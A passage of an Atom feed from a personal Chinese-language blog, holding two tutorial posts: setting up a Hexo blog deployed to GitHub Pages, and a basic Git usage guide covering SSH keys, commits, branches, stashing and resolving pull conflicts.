id="3配置github">3.配置github</span></h3><p>新建名为<code>yourname.github.io</code>的项目</p><h3><span id="4配置blog">4.配置blog</span></h3><p><strong>注：<code>_config.yml</code>中所有<code>:</code>后都要有个空格！</strong></p><p>修改<code>Myblog/_config.yml</code><br>主要部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># Site</div><div class="line">title: </div><div class="line">subtitle:</div><div class="line">description:</div><div class="line">author: </div><div class="line">language: zh-CN</div><div class="line"></div><div class="line">#Writing</div><div class="line">post_asset_folder: true     # 添加文章时自动生成同名文件夹用来放图片</div><div class="line"></div><div class="line"># URL</div><div class="line">url: https://yourname.github.io     # github.io分配的域名</div><div class="line">permalink: posts/:title/# 优化网站链接</div><div class="line"></div><div class="line"># Extensions</div><div class="line">theme: theme_name</div><div class="line">plugin:</div><div class="line">- hexo-generator-feed</div><div class="line">feed:</div><div class="line">    type: atom</div><div class="line">    path: atom.xml</div><div class="line">    limit: 20</div><div class="line"></div><div class="line"># Deployment</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: git@github.com:yourname/yourname.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure></p><p>修改<code>Myblog/theme/theme_name/_config.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">menu:</div><div class="line">  首页: /#blog</div><div class="line">  关于: /about</div><div class="line">  归档: /archive</div><div class="line">  RSS: /atom.xml</div></pre></td></tr></table></figure></p><h3><span id="5添加文章-页面">5.添加文章、页面</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo new page pagename      # 在source目录下生成pagename目录及pagename/index.md</div><div class="line">hexo new post article      # 在source\_post目录下生成article.md及article文件夹（放置图片）</div><div class="line">    #  hexo new article  ==   hexo new post article</div></pre></td></tr></table></figure><p>由于前面配了<code>post_asset_folder: true</code>在写文章时，只需把图片放到同名文件夹中，引用时无需具体路径直接写图片名即可</p><h3><span id="6部署">6.部署</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hexo clean      #缩写：hexo cl</div><div class="line">hexo generate   #缩写：hexo g    </div><div class="line"></div><div class="line">hexo server     #缩写：hexo s     # 部署在本地        </div><div class="line">hexo deploy     #缩写：hexo d     # 部署到github</div></pre></td></tr></table></figure><h3><span id="7备份">7.备份</span></h3><p>由于<code>hexo d</code>只会把生成的静态页面上传到github，为方便修改blog，把<code>MyBlog</code>下的所有源码传到<code>yourname.github.io.git</code>的<code>backup</code>分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cd MyBlog</div><div class="line">git init</div><div class="line">git remote add origin git@github.com:username/yourname.github.io.git</div><div class="line">git add .</div><div class="line">git commit -m &quot;#&quot;</div><div class="line">git push origin backup</div></pre></td></tr></table></figure></p><p>如果对应的主题没有成功上传可能原因是，主题是通过<code>git clone</code>下载的，此时主题目录下会有<code>.git</code>，相当于一个项目下包含了另一个项目，导致的出错。解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">删除对应主题目录下的.git</div><div class="line">git rm -rf --cached theme_name/</div></pre></td></tr></table></figure></p><h3><span id="参考">参考</span></h3><p><a href="https://hexo.io/docs/" target="_blank" rel="external">https://hexo.io/docs/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;0&quot;&gt;0&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;建议先看&lt;a href=&quot;/2000/01/01/Git/&quot;&gt;Git&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;1安装nodejs&quot;&gt;1.安装NodeJs&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https
      
    
    </summary>
    
      <category term="搭博客" scheme="https://unothing.github.io/categories/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="hexo" scheme="https://unothing.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Git</title>
    <link href="https://unothing.github.io/posts/Git/"/>
    <id>https://unothing.github.io/posts/Git/</id>
    <published>1999-12-31T16:00:00.000Z</published>
    <updated>2018-05-30T12:37:48.540Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1初始化">1.初始化</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git config --global user.name &quot;Your Name&quot;</div><div class="line">git config --global user.email &quot;email@example.com&quot;</div><div class="line"></div><div class="line">mkdir MyBlog</div><div class="line">cd MyBlog</div><div class="line">git init</div></pre></td></tr></table></figure><h3><span id="2关联github">2.关联github</span></h3><p>本地git关联github帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</div><div class="line"></div><div class="line">在用户主目录中.ssh目录里生成id_rsa和id_rsa.pub两个文件</div><div class="line">把id_rsa.pub粘贴到github的SSH KEYS里</div></pre></td></tr></table></figure></p><p>关联仓库的两种情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git remote add origin git@github.com:username/MyBlog.git</div><div class="line"># 除了git协议还支持https://github.com/username/MyBlog.git，但是用https，在push时会要求填帐号密码</div><div class="line"></div><div class="line"></div><div class="line">git clone git@github.com:username/MyBlog.git</div><div class="line">#从远程仓库克隆时，实际上Git会自动把本地的master分支和远程的master分支对应起来，并且远程仓库的默认名称是origin。</div></pre></td></tr></table></figure></p><h3><span id="3添加与推送文件">3.添加与推送文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">vim readme.txt</div><div class="line">vim index.php</div><div class="line">git add readme.txt</div><div class="line">git add index.php</div><div class="line">    # $ git add readme.txt</div><div class="line">    # warning: LF will be replaced by CRLF in readme.txt.</div><div class="line">    # The file will have its original line endings in your working directory.</div><div class="line">    # 原因：windows下vim自动给最后加了一个换行，可改用notepad++编辑文件</div><div class="line"></div><div class="line">#可以用 git add -A 或 git add . 提交所有变化</div><div class="line"></div><div class="line">git commit -m &quot;commit 2 files together&quot;</div><div class="line">    # git commit -m &quot;#&quot;     无描述</div><div class="line"></div><div class="line">rm readme.txt</div><div class="line">git rm readme.txt</div><div class="line">git commit -m &quot;remove readme.txt&quot;</div><div class="line"></div><div class="line">git push -u origin master       # 第一次加上-u和远程master分支关联</div><div class="line">git push origin master</div></pre></td></tr></table></figure><h3><span id="4分支">4.分支</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">git branch dev      # 添加dev分支</div><div class="line">git checkout dev        # 切换分支      </div><div class="line">        # git checkout -b dev       新建并切换到dev分支</div><div class="line">git branch      # 查看分支</div><div class="line"></div><div class="line">git checkout master</div><div class="line">git merge dev       # git merge命令用于合并指定分支到当前分支</div><div class="line"></div><div class="line">git branch -d dev       #删除dev</div><div class="line"></div><div class="line">git push origin dev</div><div class="line"></div><div class="line"># 默认git clone 只有master 不会有分支，该命令把远程的dev分支拉到本地</div><div class="line">git checkout -b dev origin/dev</div></pre></td></tr></table></figure><h3><span id="5遇到的问题">5.遇到的问题</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 拉取最新变更</div><div class="line">git pull</div></pre></td></tr></table></figure><p><code>git pull</code>失败<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Please commit your changes or stash them before you merge.</div></pre></td></tr></table></figure></p><p>是因为有本地变更但没有<code>commit</code>。<br>解决办法：<br>1.<code>commit</code><br>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git stash# 备份当前的工作区的内容</div><div class="line">git pull</div><div class="line">git stash pop# 从Git栈中读取最近一次保存的内容，恢复工作区的相关内容。</div></pre></td></tr></table></figure></p><p>接下来<code>diff</code>一下此文件看看自动合并的情况，并作出相应修改。<br>3.放弃本地修改，直接覆盖之<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git reset --hard</div><div class="line">git pull</div></pre></td></tr></table></figure></p><h3><span id="参考">参考</span></h3><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="external">廖雪峰git教程</a></p><p><a href="https://git-scm.com/" target="_blank" rel="external">Git官网</a></p><p><a href="https://github.com/github/gitignore" target="_blank" rel="external">gitignore</a></p><p><a href="https://blog.csdn.net/lincyang/article/details/21519333" target="_blank" rel="external">Git冲突：commit your changes or stash them before you can merge.</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;1初始化&quot;&gt;1.初始化&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=
      
    
    </summary>
    
      <category term="搭博客" scheme="https://unothing.github.io/categories/%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="git" scheme="https://unothing.github.io/tags/git/"/>
    
  </entry>
  
</feed>
